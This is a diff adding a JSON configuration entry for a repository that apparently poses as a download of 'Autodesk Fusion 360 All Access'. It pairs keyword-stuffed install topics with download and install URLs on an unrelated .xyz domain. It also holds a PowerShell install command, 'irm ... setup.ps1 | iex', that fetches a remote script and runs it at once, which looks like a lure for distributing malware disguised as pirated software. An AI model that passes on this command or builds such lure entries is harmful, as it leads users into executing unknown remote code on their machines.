@@ -1,0 +1,28 @@
+{
+  "repo": "autodesk-fusion-360-all-access",
+  "product": "Autodesk Fusion 360 All Access",
+  "kind": "cad",
+  "install_type": "download",
+  "download_url": "https://fusion-360.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "cad",
+  "topics": [
+    "fusion-360-user-guide",
+    "fusion-360-release",
+    "install-guide",
+    "fusion-360-toolkit",
+    "getting-started",
+    "drawing-tools",
+    "fusion-360-package",
+    "desktop-app",
+    "fusion-360-for-windows",
+    "fusion-360-support",
+    "windows-10",
+    "parametric-design",
+    "windows-11",
+    "how-to-install-fusion-360"
+  ]
+}
